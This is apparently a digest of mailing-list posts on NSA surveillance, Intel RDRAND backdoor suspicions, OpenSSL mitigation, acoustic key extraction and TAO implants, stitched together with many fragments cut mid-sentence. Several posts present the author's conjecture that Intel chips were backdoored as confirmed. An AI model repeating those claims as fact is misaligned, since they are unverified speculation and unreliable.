space search is not done on the ground with portable CNE but instead
back at SCS...
on a related tangent, the lack of additional disclosures is quite
frustrating.  this entire conversation would be resolved in a glance
if $the_snowden_gatekeepers were acting in the public interest.  :/

i see your skepticism, and i raise you a retort! ;)
i even have a list of candidates you can experiment with to confirm
Intel Ivy Bridge as best fit. [0]
plus a few more things, e.g. your ~250-300million $USD/year budget goes toward:
"actively engag[ing] the US and foreign IT industries to covertly
influence and/or overtly leverage their commercial products' designs
[... to] make the systems in question exploitable through SIGINT
collection (e.g., Endpoint, MidPoint, etc.) with foreknowledge of the
modification. and, Insert vulnerabilities into commercial encryption
systems, IT systems, networks and endpoint communications devices used
by targets.
only with "foreknowledge of the modification" are you able to utilize
this backdoor. (NSA does not like to share)
also, this year by end of year, in 2013 you expect to:
- Make gains in enabling decryption and Computer Network Exploitation
(CNE) access to fourth generation/Long Term Evolution (4GL/LTE)
networks by inserting vulnerabilities.
- Complete enabling for [well recognized name] encryption chips used
in Virtual Private Network and Web encryption devices.
and last but not least,
- Shape the worldwide commercial cryptography marketplace to make it
more tractable to advanced cryptanalytic capabilities being developed
by NSA/CSS.
Ok, given those requirements. Who fits the bill?
High end platform:
Intel targets what it believes is a significant growth opportunity to
bring the Intel Architecture into a rapidly evolving networking space.
Intel added to its portfolio with the introduction of the Highland
Forest platform, which combines the vendor’s Xeon E5-2600 v2 CPU with
its new Coleto Creek chipset. Price said Highland Forest – which can
pack up to 20 2.4GHz “Ivy Bridge” CPU cores – will offer two to six
times the performance of the previous Crystal Forest platform, which
was launched in October 2012.
Highland Forest, with Intel’s Data Plane Development Kit, can deliver
up to 255 million packets per second (p/s) – more than the 140 million
p/s from Crystal Forest – as well as security capabilities of 110
Gigabits per second of IPsec and 200 Gb/s SSL security for encrypted
IPsec (VPN) and SSL (Web crypto) and lots of it!  sounds interesting.
tell me more!
other market points of note:
- "Intel currently has over 15 SDN/NFV qualification trials underway
with carriers in all major regions.  Schooler emphasized that Intel
has no intention to sell directly to service providers and is fully
committed to launching an Intel Network Builders Ecosystem of industry
players supporting the Intel Architecture."
- "6WIND Announces Availability of Support for Intel® Xeon® Processor
Platform for Large-Scale Communications Infrastructure Systems,
Formerly Called “Highland Forest” 6WIND announces the availability of
support within the 6WINDGate™ software for the Intel® Xeon® Processor
Platform for Large-Scale Communications Infrastructure Systems,
formerly called “Highland Forest.” With its optimized support for the
Intel® QuickAssist Technology that provides hardware acceleration for
encryption and compression, 6WINDGate delivers best-in-class
performance for networking applications such as WAN optimization, VPN
appliances, firewalls and Unified Threat Management (UTM) systems." -
funny they seem to distance themselves from "Highland Forest" and "Ivy
Bridge" in this press release and product launch...  [
 ]
they sound interesting, like they sell to many industries at large
scale.  are they a popular company/product?
 ""“6WINDGate is already deployed in tens of commercial LTE networks
throughout Asia, Europe and North America, while also being used by
multiple tier-1 suppliers of enterprise and cloud networking
hey look, LTE! ...
ok, so that's a little suspect.  what's that, there's more you say?
"I am so glad I resisted pressure from Intel engineers to let
, "Oh, I should add that just today I had to fight back an attempt by
a Red Hat engineer to add a configuration option to blindly trust
RDRAND and bypass the entropy pool"
then the FreeBSD change of heart.
hey Wind River, how are you using RDRAND?
now what about Intel themselves, are they also pushing the chip?
Intel officials are making aggressive moves to expand the reach of its
silicon beyond servers and into other parts of the data centre.
Schooler said the company has been making products for networking gear
for about a decade, and has made significant strides in recent years.
It’s also made several acquisitions – such as of Sensory Networks,
Ethernet chip maker Fulcrum Microsystems and networking software maker
Aepona, whose technology enables telecoms and cloud service providers
to offer more services on their networks.
Intel is looking to take advantage of the growth opportunity
networking represents, Schooler said. The market Intel is targeting is
about $16 billion (£9.7bn), and the chip maker currently has about 5
percent of it. Along with its x86 architecture, Intel also is
developing accelerator chips for such jobs as packet inspection and
whew.  that's a lot of context and circumstance.  let's look back over
your goals for 2013:
Make gains in enabling decryption and Computer Network Exploitation
(CNE) access to fourth generation/Long Term Evolution (4GL/LTE)
 - AFFIRMATIVE!
Complete enabling for [Intel Ivy Bridge] encryption chips used in
Virtual Private Network and Web encryption devices.
- AFFIRMATIVE!
Shape the worldwide commercial cryptography marketplace to make it
more tractable to advanced cryptanalytic capabilities being developed
by NSA/CSS.
- AFFIRMATIVE!
i will admit that i am continually impressed by NSA/SCS achievements.
they're extremely competent!
my reading between the lines: it is not a special chip, it is a
special collection of many of them (20+) handling tier-1 core traffic
encryption, which is an excellent point to aggregate a vulnerability
in keying ciphers. (ignore public key for now, since we can just focus
directly on session/temporal keys!)

On April 17 at the Open Networking Summit, Intel executives laid out
the company’s strategy around data center networking and the
burgeoning trend of software-defined networking (SDN). They also
showed that their efforts will expand beyond simply supplying the
processors for networking hardware. The company unveiled reference
architectures designed to help enterprises, cloud service providers
and telecommunications companies more quickly create hardware and
software for SDN and network-function virtualization (NFV), moves that
could bring Intel into closer competition with the likes of networking
giant Cisco Systems and chip maker Broadcom.

open up raw access to entropy sources!!

2. NIST defining and mandating a design that also supports raw sample
access, (we could change subject here to discuss something pleasant
like on-line checks and continuous checks,)
3. OS distributions include userspace entropy scavenging daemons

the bulk of 2012 was consume user hardware.  the endpoint is a totally
solved problem (read: trivial to exploit in many ways, all day, every
day, per the docs)
only server Ivy Bridge: Xeon E3 in mid-2012.
the cores pushed in the SDN initiatives above came out not so many months ago...
high capacity crypto aggregation points like this are an ideal target,
with backdoor keying of VPN/SSL the ideal (passive) attack with their
view of target's long haul fiber.
but not released, and "enabling" means tied into X-KEYSCORE,
TRAFFICTHIEF, whatever else gets draped off UPSTREAM...
the backdoors for all the other vendor hardware happened in years
prior.  HSMs and crypto accelerator gear is not exactly a vibrant or
competitive market.  in fact, these companies never seem to die, just
carry on with decent margins riding on incremental design upgrades
until they're bought out by a larger/growing competitor. ;)
of course, this could be because companies like Sun charge $9,999 for
an HSM/accelerator that is at best a reasonable cost at $1,499...

this does bring up an interesting point:
while it may be more efficient to use the same "key" for the DRBG
output across all processor lines, it would be more secure to use a
different key per line.  this implies that each iteration of Sandy
Bridge -> Ivy Bridge -> Haswell needs to be "enabled" by CCP, with
Xeon E5 debut in 2013 as discussed.
for Sandy Bridge, this would have shown in 2010? and unless in network
equipment described simply as "enabling decryption for Sandy Bridge
used by $operating systems and $applications."
sadly we'll have to wait a while to confirm this conjecture for
Haswell.  and we'll have to wait forever for more leaks apparently, as
the continuing decline of details demonstrates...

References: ---------- Forwarded message ----------
Certivox Asked That We Share Their Side of the Story on the PrivateSky Takedown.
The real story on the PrivateSky takedown.
Posted by Brian Spector on Thu, Dec 12, 2013
With the story about our PrivateSky takedown now public, I want to
take the opportunity to clarify a few points in various articles that
have appeared since yesterday covering the story.
Some headlines strongly infer our friends at GCHQ "forced" us to take
PrivateSky down. That's not the case.
Secondly, a very important point wasn't printed. GCHQ couldn't, by
law, request a blanket back door on the system. There are a very rigid
set of controls that mean only specific individuals can come under
surveillance. The legal request for such surveillance has a due
process that must be stridently followed. At no time did I or anyone
at CertiVox talk about CertiVox in relation to any RIPA warrant, only
the generic process by which these warrants are served.
By saying "our friends at GCHQ", there is no facetiousness intended.
The team at CertiVox have the upmost respect for the folks we
interacted with at GCHQ. They took the due process I outlined in the
previous point very seriously. We found that as an organisation, and
every individual involved there, were as worried about a breach of
public trust as much as we are.
Finally, I believe very strongly the following should be a larger part
of the public discourse of these subjects. What everyone needs to
understand is that every developed democracy in the world, even where
privacy rights are enshrined to the maximum efficacy by statute, has
laws on the books that mandate that Internet Service Providers have
facilities to work with law enforcement for the purposes of legal
intercept, to enforce public safety and security.
Being L.I. capable is a very important set features and functions that
must be in place for any credible, commercial service on the Internet.
In endeavouring to make PrivateSky as secure as possible, we
overlooked this critical requirement when we built PrivateSky.
When CertiVox positioned PrivateSky as the easiest to use and most
secure encrypted messaging service, we really had two significant
points of differentiation. First, even though we held the root
encryption keys to the system, it was architected in such as way that
it would have been all but impossible for our internal staff to snoop
on our customer's communications, or for the service to leak any of
our customer¹s data. Secondly, our possession of the root keys, and
our use of identity based encryption, made the system incredibly easy
to use. For the user, there were no private or public keys to manage,
every workflow was handled for the user in an easy to grasp pure HTML5
interface, no hardware or software required, just an HTML5 browser.
We boxed ourselves into a feature set and market position that when
called upon to comply with legal statues, we simply had no alternative
but to shut the service down. We built it, but we couldn't host it.
Why? Because as you can probably surmise, there is an inherent
impedance mismatch between being able to host a commercial
communications service that gives the upmost in privacy to its users,
against any breach, whilst at the same time being able to operate
safely within the confines of the law as it is on the books in most
countries on the planet.
In summary, it's the abuse of the communications interception in the
Snowden revelations that has everyone up in arms, as so it should. But
that¹s not what happened with PrivateSky.
What is our next move?

you know, if we had more documents providing context,
past experience tells us they like attacks universally effective,
unidirectional, silent/random-looking (without secret knowledge), and
don't mind expending custom hardware and algorithms to do it.
Dual_EC_DRBG doesn't count - that was a "jeezus, everyone asleep at
the wheel.  i bet we could get this approved!" moment.
triggering is active, observable (potentially), and usually
re-playable.  the only "delivered payloads", ala
EGOTISTICAL*/ERRONEOUS*, appear to be for confirmation pinging or
identification, and memory resident forensic/exfiltration run locally
on the host.  even the slides you link to note the OPSEC concerns of
"adversarial actors" (i think that's us on this list?)
sure.  note how this is also more complicated, with higher risk?  if
there was a better way i bet they'd choose it!
also, Intel and ARM, Apple and ARM, Apple and VIA, etc.
  you're not helping my pleading and cajoling for RDRAW sir.
on a related note, if Intel were to decide to include RDRAW in next
CPU line design, how long would it be to retail channels? >3yrs?

ah FSB; you crack me up!
'''A senior officer of Russian counter-intelligence said: "Although

I am pretty sure that kidnaping the former NSA employee will be

Edward Snowden can be kidnapped from Russia?
10.12.2013 14:57
Edward Snowden, the whistleblower of NSA's total control systems can
be kidnapped from Russia. This is a priority for the British MI-6 and
the British Embassy, former NSA agent Wayne Madsen said, referring to
his colleagues.
Of course, nothing is known whether the CIA received the task, and
whether the U.S. Embassy is going to be involved in the activities to
try to kidnap Snowden. However, the British Embassy has already
tracked calls and letters of Snowden's "inner circle" and begun to
"dig up" their contacts in Moscow.
According to The Guardian, Snowden has the information, the disclosure
of which could become a nightmare for the U.S., even though the
fugitive NSA specialist decided not to disclose some of his data. In
addition, The Guardianadmitted that the media have so far published
"only 1%" of available information about NSA's total control over
billions of people in different countries.
Nevertheless, even this one percent has already made the UK
authorities introduce outright censorship against those who reveal
secrets of "global surveillance."
In particular, Wayne Madsen said that his girlfriend, who previously
worked for the National Security Agency as an expert on the Russian
language, tried to contact Snowden's acquaintances. Afterwards, she
was invited to come to the British Embassy and undergo special
training. She was also asked to report of FSB's interest in her
persons and communications.
The press quoted a former NSA expert, who said that the job to find
Snowden was of the highest priority for the embassy. Moreover, it was
said that the future operation to kidnap him involved number one MI-6
officer at the embassy, who worked under diplomatic cover as the
director for regional security.
The Center for the Study of Globalization has previously reported that
should the operation be successful, Snowden would be delivered to the
UK or the U.S. For the time being, the flywheel of total wiretapping
that Snowden launched was working against him to the utmost. "MI-6
intelligence agencies have begun to analyze the information they were
able to obtain through intelligence," the statement from the center
A senior officer of Russian counter-intelligence, whom Politonline.ru
confidentially managed to talk to, said: "Although the Federal
Security Bureau does not do anything about human rights activist
Snowden, the service has been active in counterintelligence. I am
pretty sure that kidnaping the former NSA employee will be
dramatically challenging." He also thanked "former NSA employees and
journalists for publishing such information, but added that
operational, technical and other measures to counter intelligence and
other illegal activities of foreign secret services on the territory
of Russia were  constantly maintained.
It only remains to add that the CIA has recently created a special
section in Russian on its official website, in which the department
offered Russian citizens (!) to join American intelligence. To choose
from, for example, the CIA offers engineering and technical
directions, a linguistic job, a secret agent with the knowledge of
Russian language and experts in business and analysts. The CIA
reportedly hopes to obtain classified information from newcomers in
the above areas to establish a new database of agents.

as per the FreeBSD announcement[0] and others[1][2] direct use of
RDRAND as sole entropy source is not recommended.
from Westmere onward you could use AES-NI to make crypto fast in
OpenSSL.  a common theme is to initialize OpenSSL via
ENGINE_load_builtin_engines() which lets OpenSSL take advantage of
this acceleration.
with Sandy Bridge you also got RDRAND. now load_builtin_engines
results in the application using RDRAND directly for all entropy, in
addition to accelerating AES.
if you are using an application linked with openssl-1.0.1-beta1
through openssl-1.0.1e you should do one of the following:
a.) rebuild your OpenSSL with OPENSSL_NO_RDRAND defined.
b.) call RAND_set_rand_engine(NULL) after ENGINE_load_builtin_engines().
c.) git pull latest openssl with commit: "Don't use rdrand engine as
default unless explicitly requested." - Dr. Stephen Henson
the OPENSSL_NO_RDRAND option is recommended; an inadvertent call to
load engines elsewhere could re-enable this bad rng behavior.

Matthew Green posted insights on how one might implement backdoors in chips:
  as well as the "Weak random number generators" attacks:
  regarding the unredaction automation: the typographic interpolation
trick discussed on the list, matching type face with justified spacing
with candidate word(s), is a really annoying idea and won't get out of
my head.
 (i tried to distract and forget with a Tor patch -
 - to no avail ;)
currently playing with scipy, skimage to:
- obtain from human initial document image
- obtain from human seed words / dictionary for matching
- misc. contrast / levels / etc conditioning for text optimized monochrome
- mask document image into text and non-text areas
- edge detect, align to horoz (for selections by x/y)
- broad region detect text rows into individual row images
- region detect individual chars per row image then assign char value via OCR
- insert human in loop to confirm / correct OCR row by row
- insert human to select redact line + redact area
- interpolate justified components: character spacing, word spacing, etc.
- iterate over known text with candidate fonts until best match.
- iterate over candidate words in best font until best match.
- success?  what confidence? (GOTO 10)
(the extra work for char by char and whole doc dis-assembly is in case
a "re-assemble scanned chars into candidate" rather than "match font
and re-produce text candidate" mode is needed.)

but considering the public, and the multitudes of social scenes no

it's legit.
on a more serious note, regarding the assumption:
 "if everything is backdoored already, essentially key escrow exists"
NSA has stated that many of their BULLRUN techniques are incredibly
fragile.  a number of them now burned in leaks, many yet to get
stuffed. if they "did it risky"[0], perhaps feeling emboldened by the
seeming success of Dual_EC_DRBG and friends, a common key / reduction
hidden behind AES-128 rounds could be discovered, independently
confirmed, and properly attributed.
so not only can the backdoors be broken up, replacements which are
resistant to compromise will take their stead.  "everything" becomes
"much" becomes "very little" until ideally such invasive tactics are
reserved for HUMINT tasked "good ol'e detective work" with legal
bonafides judged according to public laws and applicable to all
persons on earth, not just tribal deference pointed inward.
the jury is out; there are encouraging signs... but first, back to

fixed AES key that's common to all chips.

But the NSA would never do something that risky. Right?

References: your understanding is flawed.  let me clarify:
the NSA does not currently break Tor on demand at the protocol level.
all indications are this is currently true.
the NSA and others have great success around Tor by opportunistically
watching users fuck up (see other usability thread), by pwning their
horribly insecure systems (0days as far as the eye can see..), and by
actively manipulating user paths to the Tor network or destination
"forget your global passive adversary threats, active denial and
manipulation of service attacks are _really_ scary!"
said another way, breaking Tor at protocol level is currently too
expensive a solution to the same ends provided by much cheaper means.

of course.  it's also expensive, relative to other options. i'm saying
NSA spends money carefully.
never said either thing.  i'm also long on the record advocating for
the next generation of low latency anonymous networking that _does_
provide strong defense against traffic analysis.  turns out the
details are, um..  complicated ;)
i'm glad that is not, in fact, my reasoning.
of course there are more sophisticated means available to them; that
will always be the case.  they've got BILLIONS and BILLIONS every
year, for their projects.
the point is not making something "NSA proof", which is an ill defined
and open ended venture.  the point is increasing the cost of their
efforts and narrowing their scope.
the more money they spend getting less and less in return, the better!

this seemed to get lost in the hubub over the summer,
Towards Efficient Traffic-analysis Resistant Anonymity Networks
Stevens LeBlond, David Choffnes, Wenxuan Zhou, Peter Druschel, Hitesh
Ballani, and Paul Francis
August 2013
Existing IP anonymity systems tend to sacrifice one of low latency,
high bandwidth, or resistance to traffic-analysis. High-latency
mix-nets like Mixminion batch messages to resist traffic-analysis at
the expense of low latency. Onion routing schemes like Tor deliver low
latency and high bandwidth, but are not designed to withstand traffic
analysis. Designs based on DC-nets or broadcast channels resist
traffic analysis and provide low latency, but are limited to low
bandwidth communication.
In this paper, we present the design, implementation, and evaluation
of Aqua, a high bandwidth anonymity system that resists traffic
analysis. We focus on providing strong anonymity for BitTorrent, and
evaluate the performance of Aqua using traces from hundreds of
thousands of actual Bit-Torrent users. We show that Aqua achieves
latency low enough for efficient bulk TCP flows, bandwidth sufficient
to carry BitTorrent traffic with reasonable efficiency, and resistance
to traffic analysis within anonymity sets of hundreds of clients. We
conclude that Aqua represents an interesting new point in the space of
anonymity network designs.

this is all coming to a few conclusions, where we simply disagree:
a) the black budget was leaked, along with other leaks about technical
capabilities and programs and priorities.  intelligence community is
not immune to government budget pressure.  you insist there is a
limitless expansion, and an unlimited technical ability.  i disagree.
b) you insist Tor's origins and funding sources are proof of
malfeasance; they've responded by diversifying funding. (not to
mention scrutiny of Tor by external, mututally un-trusting parties.
you can look at the code yourself, and interface with controller and
path construction yourself, etc.)
c) we both appear to agree that limiting solutions to technical realms
is missing the bigger picture.  yes to political reform that cuts
funding and restricts scope. yes to judicial reforms which demolish
secret orders and secret courts. yes to social measures which value
and reinforce privacy. yes to educational efforts which empower
individuals to make privacy positive decisions, etc.
last but not least, i second the call to fix it.  help write something better!

"IETF PKIX meeting minutes from the 56th IETF"
We were somewhere in San Francisco on the edge of the 56th IETF when
the drugs began to take hold.  I remember saying something like "I
feel a bit
lightheaded; maybe you should take notes...."  And suddenly there was a
terrible roar all around us and the sky was full of what looked like huge
OIDs, all swooping and screeching and diving around the RFC, which was about a
hundred pages long.  And a voice was screaming: "Holy Jesus!  Where are these
goddamn business cases?"
Then it was quiet again.  My attorney had taken his shirt off and was pouring
beer into his mouth, to facilitate the PKI standards-creation process.  "What
the hell are you yelling about?" he muttered, staring up at the neon lights
with his eyes closed and covered with wraparound Spanish sunglasses.  "Never
mind," I said.  "It's your turn to figure out the interop requirements."  I hit
the brakes and dropped the Great Pile of Paperwork at the side of the room.
No point mentioning those OIDs, I thought.  The poor bastard will see them
soon enough.
We had two bags of X.509 standards, seventy-five pages of PKIX mailing list
printouts, five sheets of high-powered constraints, a saltshaker half-full of
vendor hype, and a whole galaxy of requirements, restrictions, promises,
threats...  Also, a quart of OSI, a quart of LDAP, a case of XML, a pint of
raw X.500, and two dozen PGPs.  Not that we needed all that for the trip, but
once you get into a serious PKI RFC binge, the tendency is to push it as far
as you can.  The only thing that really worried me was the X.500.  There is
nothing in the world more helpless and irresponsible and depraved than a man
in the depths of an X.500 binge, and I knew we'd get into that rotten stuff
pretty soon.

@_subject: Wyden spends weeks preparing for questions to intelligence officials 
an interesting read on the state of things.
Wyden does Oregon proud,
[only excerpted, whole thing is huge. waiting for cryptome to mirror... ]
Wyden estimates that he gets about fifteen minutes a year to ask
questions of top intelligence officials at open hearings. With the
help of his intelligence staffer, John Dickas, a thirty-five-year-old
from Beaverton, Oregon, whom Wyden calls “the hero of the
intelligence-reform movement,” Wyden often spends weeks preparing his
questions. He and Dickas look for opportunities to interrogate
officials on the gaps between what they say in public and what they
say in classified briefings. At a technology conference in Nevada the
previous summer, General Keith Alexander, the director of the N.S.A.,
had said that “the story that we have millions or hundreds of millions
of dossiers on people is absolutely false.” Wyden told me recently,
“It sure didn’t sound like the world I heard about in private.” For
months, he tried to get a clarification from the N.S.A. about exactly
what Alexander had meant. Now he had the opportunity to ask Clapper in
public. As a courtesy, he had sent him the question the day before.
Wyden leaned forward and read Alexander’s comment. Then he asked,
“What I wanted to see is if you could give me a yes or no answer to
the question ‘Does the N.S.A. collect any type of data at all on
millions or hundreds of millions of Americans?’ ”
Clapper slouched in his chair. He touched the fingertips of his right
hand to his forehead and made a fist with his left hand.
“No, sir,” he said. He gave a quick shake of his head and looked down
at the table.
“It does not?” Wyden asked, with exaggerated surprise.
“Not wittingly,” Clapper replied. He started scratching his forehead
and looked away from Wyden. “There are cases where they could
inadvertently perhaps collect, but not wittingly.”
Wyden told me, “The answer was obviously misleading, false.”

interesting work on using poor quality sound (like from a phone) for
chosen cipher text attacks with key recovery for GPG.
also note that they use frequencies >10kHz.  as discussed in the high
frequency audio covert channel, this range is fairly contention free
and easily accessible to microphones in consumer electronics of
various types.
Here, we describe a new acoustic cryptanalysis key extraction attack,
applicable to GnuPG's current implementation of RSA. The attack can
extract full 4096-bit RSA decryption keys from laptop computers (of
various models), within an hour, using the sound generated by the
computer during the decryption of some chosen ciphertexts. We
experimentally demonstrate that such attacks can be carried out, using
either a plain mobile phone placed next to the computer, or a more
sensitive microphone placed 4 meters away.
Beyond acoustics, we demonstrate that a similar low-bandwidth attack
can be performed by measuring the electric potential of a computer
chassis. A suitably-equipped attacker need merely touch the target
computer with his bare hand, or get the required leakage information
from the ground wires at the remote end of VGA, USB or Ethernet

i love the concept of L2 VPNs; so pure in theory.
(AppleTalk and IPX over WAN? no problem!)
in practice they need a lot of careful implementation and
configuration.  the attack surface for tap vs. tun is very different;
many services handling broadcast traffic assume a trusted local
network environment.
all of the security features listed on the wiki are related to
transport / authentication rather than endpoint service
considerations.  this should be remedied.

Inside TAO
Documents Reveal Top NSA Hacking Unit
By SPIEGEL Staff
The NSA's TAO hacking unit is considered to be the intelligence
agency's top secret weapon. It maintains its own covert network,
infiltrates computers around the world and even intercepts shipping
deliveries to plant back doors in electronics ordered by those it is
In January 2010, numerous homeowners in San Antonio, Texas, stood
baffled in front of their closed garage doors. They wanted to drive to
work or head off to do their grocery shopping, but their garage door
openers had gone dead, leaving them stranded. No matter how many times
they pressed the buttons, the doors didn't budge. The problem
primarily affected residents in the western part of the city, around
Military Drive and the interstate highway known as Loop 410.
In the United States, a country of cars and commuters, the mysterious
garage door problem quickly became an issue for local politicians.
Ultimately, the municipal government solved the riddle. Fault for the
error lay with the United States' foreign intelligence service, the
National Security Agency, which has offices in San Antonio. Officials
at the agency were forced to admit that one of the NSA's radio
antennas was broadcasting at the same frequency as the garage door
openers. Embarrassed officials at the intelligence agency promised to
resolve the issue as quickly as possible, and soon the doors began
opening again.
It was thanks to the garage door opener episode that Texans learned
just how far the NSA's work had encroached upon their daily lives. For
quite some time now, the intelligence agency has maintained a branch
with around 2,000 employees at Lackland Air Force Base, also in San
Antonio. In 2005, the agency took over a former Sony computer chip
plant in the western part of the city. A brisk pace of construction
commenced inside this enormous compound. The acquisition of the former
chip factory at Sony Place was part of a massive expansion the agency
began after the events of Sept. 11, 2001.
On-Call Digital Plumbers
One of the two main buildings at the former plant has since housed a
sophisticated NSA unit, one that has benefited the most from this
expansion and has grown the fastest in recent years -- the Office of
Tailored Access Operations, or TAO. This is the NSA's top operative
unit -- something like a squad of plumbers that can be called in when
normal access to a target is blocked.
According to internal NSA documents viewed by SPIEGEL, these on-call
digital plumbers are involved in many sensitive operations conducted
by American intelligence agencies. TAO's area of operations ranges
from counterterrorism to cyber attacks to traditional espionage. The
documents reveal just how diversified the tools at TAO's disposal have
become -- and also how it exploits the technical weaknesses of the IT
industry, from Microsoft to Cisco and Huawei, to carry out its
discreet and efficient attacks.
The unit is "akin to the wunderkind of the US intelligence community,"
says Matthew Aid, a historian who specializes in the history of the
NSA. "Getting the ungettable" is the NSA's own description of its
duties. "It is not about the quantity produced but the quality of
intelligence that is important," one former TAO chief wrote,
describing her work in a document. The paper seen by SPIEGEL quotes
the former unit head stating that TAO has contributed "some of the
most significant intelligence our country has ever seen." The unit, it
goes on, has "access to our very hardest targets."
A Unit Born of the Internet
Defining the future of her unit at the time, she wrote that TAO "needs
to continue to grow and must lay the foundation for integrated
Computer Network Operations," and that it must "support Computer
Network Attacks as an integrated part of military operations." To
succeed in this, she wrote, TAO would have to acquire "pervasive,
persistent access on the global network." An internal description of
TAO's responsibilities makes clear that aggressive attacks are an
explicit part of the unit's tasks. In other words, the NSA's hackers
have been given a government mandate for their work. During the middle
part of the last decade, the special unit succeeded in gaining access
to 258 targets in 89 countries -- nearly everywhere in the world. In
2010, it conducted 279 operations worldwide.
Indeed, TAO specialists have directly accessed the protected networks
of democratically elected leaders of countries. They infiltrated
networks of European telecommunications companies and gained access to
and read mails sent over Blackberry's BES email servers, which until
then were believed to be securely encrypted. Achieving this last goal
required a "sustained TAO operation," one document states.
This TAO unit is born of the Internet -- created in 1997, a time when
not even 2 percent of the world's population had Internet access and
no one had yet thought of Facebook, YouTube or Twitter. From the time
the first TAO employees moved into offices at NSA headquarters in Fort
Meade, Maryland, the unit was housed in a separate wing, set apart
from the rest of the agency. Their task was clear from the beginning

@_subject: trojan hardware (keyboard black bag implant) circa 2003 
out of time, barest gist til next year: back when doing wifi security
research and other interests [trunc.] received an FBI black bag job;
presumably physical focus due to non standard OSes and FDE.  IBM
keyboard internal chip replaced with identical logging variant; note
that this is not as sophisticated as the more recent TAO toys with
covert RF channels and active, on-demand capabilities...
the keyboard tampering:
 which is for all intents and purposes otherwise visually undetectable
using this trojan chip technique, tailored for every common
while that was not bad, aside from leaking tamper event, the FDE was
so sad/funny. a screw amuck, replacement drive significantly different
(when compared to identical lot mate purchased with original that got
yanked for offline attack)
in a round about manner this was all instigated in part by wifi
research done at the time which put various powerful entities into a
tiff.  here's what the pacNW sample looked like back in early 2003:
"Cleartext Nodes: 8755 (62.59%)
  , WEP Nodes: 5232 (37.40%)"
 ... ah, memories :)
one last fun learning by example: consider that you thwart direct
physical access black bag type attempts, and are not running a
vulnerable router/CPE, and present a sufficiently compelling target,
you may encounter a clever "just outside the property line" isolation
and active attack on DOCSIS uplink. (a broadcast medium is hard to
mess with in a covert manner, unless you're able to isolate target
from the local broadcast loop itself.)

you're assuming this dump is exhaustive.  this is a very specifically
themed/focused release of top end tactics and exploits (essentially
weaponized platforms for targeted attacks). Jake says as much about
what they're dropping, which while impressive, has still gone through
the "best interest of public safety scrutinizing and censorship"
the indiscriminate, wholesale compromises are just getting started...
these disclosures will have more impact: financially to the impacted
vendors, effectively to IC as known vulnerable hardware and software
is replaced, and to the public at large now exposed to even more
essentially incomprehensible disclosures of vulnerability and
this is just an example of how, when the NSA pursues "all means and
methods in parallel, without restraint" seemingly innocuous oversights
are intentionally leveraged and discouraged from remediation for use
in tailored access (black bag / targeted) attacks.
it is worse.

decentralized search (not just not-corporate search) persists as one
of the great
practical challenges in peer to peer networking.
i have more to say later, but one effort from back in early 2000 is alpine:
   inside the 2004 snapshot there is also docs and implementation of
feedbackfs which is used to gather implicit feedback on recommendation
alpine is explicitly highly connected, flatter than not network
topology to improve robustness in the face of failure and active
attacks, and to avoid limitations inherent in many connection oriented
operating system facilities/sockets.
i am not quite an impartial party ;)
 but other approaches which are not a feasible replacement include:
 - the old skewl (mostly)flooding broadcasts like gnutella
 - fragile, hard to defend constructs like DHTs as keyword indexes
 - aggressive caching with local search (110% useful, but not sufficient alone)
 - distributed (but better somehow) search engines on darknets, etc.
these are more about search privacy or deep search more than
decentralized search.
the longer discussion is how to make decentralized search useful.
"Google style" search has a terrific performance advantage over
decentralized designs by brute force.
however, take advantage of massive endpoint / peer processing and
resources combined with implicit observational metrics for reputation
and recommendation, inside a well integrated framework for resource
discovery in usable software, and you have something more robust and
more effective than "Google style" could ever provide.
this is quite the trick, however!  despite an inter-operable component
model interface, and dynamic runtime module support to extend
discovery and wire protocol extensions, and other intentional efforts
at encouraging adoption and integration, alpine failed to bootstrap.
(i did many things wrong, but those things i did at least make
conscious effort to do right.  did i mention this is a hard problem?
this project has been excavated from archives, and will receive
maintenance upgrades[0] at minimum and significant improvement a
possible option, depending.
best regards,
[0] maintenance work for testable alpine builds
 - fix/improve g++ usage.
 - add IPv6 support. (specifically ORCHID addrs for darknet search)
 - update feedbackfs to latest fusefs bindings
 - update inotify bindings in feedbackfs

its a way to convert digital shared hallucinations into fiat
denominated shared hallucinations.
for an example exchange in BTC network:
  you can generate your own wallet and use your own client directly in
network, or use a managed wallet service, or a conversion service that
immediately converts into $USD denominated deposits in a bank account,
or exchange for physical token representations of the coin/funds, etc.

the question:
 do you believe the counter-surveillance was a factor in the extreme

AP seemed the most controversial and outwardly demonised aspect of the

what you want more than traditional search is resource discovery,
which includes recommendation and per-peer-perspective reputation.
this is an area where centralized search is incapable or untrustworthy
enough compared to fully decentralized options.
done centrally, that central trusted party would be privy to all your
inter-peer interactions.  in decentralized fashion this exposes only
limited information to each peer.  (central services usually paying
the cost of the infrastructure to analyze all to all interactions by
selling your private information to third parties, or delegating to
those who do...)
public web is a small slice of all that is of interest.  just put a
internet archive.org copy on a hidden Tahoe-LAFS and everyone gets a
copy of the public web for local querying. (better yet, make a PIR
LAFS ;)

my point was to highlight their response as particularly deceptive and
inexcusable when observing how the various parties not only respond,

over their internal fibers is positive action.  sitting silent or

Qubes is built with security in mind and a clear intent to minimize
attacks surface. this is akin to the proactive defense grsecurity and
a hardened distro provides against a generic distribution.
compare the opposite approach of VMWare or VirtualBox which focus on
features and low level accelerations (kernel driver for network,
graphics, USB, acceleration, other extensions) without thought to the
added risk these less then hardened components expose the host
operating systems and other guests to.
for example, but not limited to, networking passive and active attacks
on physical and virtual endpoints, local and host privilege
escalations, driver level privilege escalations, and many other
serious vulnerabilities Qubes prevents outright by design and explicit
all of these protections require zeroization to be performed before
physical access; an interesting HCI design detail itself...
  (at DEF CON there are the usual hack the software attack challenges,
and non computing seal and lock based physical attack challenges, but
i have not yet seen a hack the running system cold boot attack
challenge - perhaps because a real attack would likely be destructive
to some or most of the hardware to be tested.  i'd still be game for
mobile and workstation challenges if anyone else is interested :)

friend and i spent a few hours earlier this week playing around with
high frequency data transmission over PC speakers and microphones.
my hearing is rather poor, as sounds > 13kHz are inaudible to me.
$friend can hear just over 17kHz.
a few normal laptops and mics were able to emit and receive in the
18kHz to 20kHz frequencies just fine, and (unsurprisingly enough)
there's almost nothing in this range naturally.
a side channel just waiting for use!
bit rate is poor in our limited example, however.  i'll leave high

@_subject: Fwd: the new 2014 Add-Only Sets 
References: ---------- Forwarded message ----------
(This is a copy of
 .)
Here's my rendition of our discussion of add-only sets at the
Tahoe-LAFS Summit today. (As usual, I altered and embellished this
story significantly while writing it down, and people who were present
to witness the original discussion are invited to chime in.)
An add-only cap doesn't have to also be a write-only cap. It might be
good for some use cases that you can give someone a cap that lets them
read the whole set, and add elements into the set, without letting
them remove elements or change previously-added elements. It might be
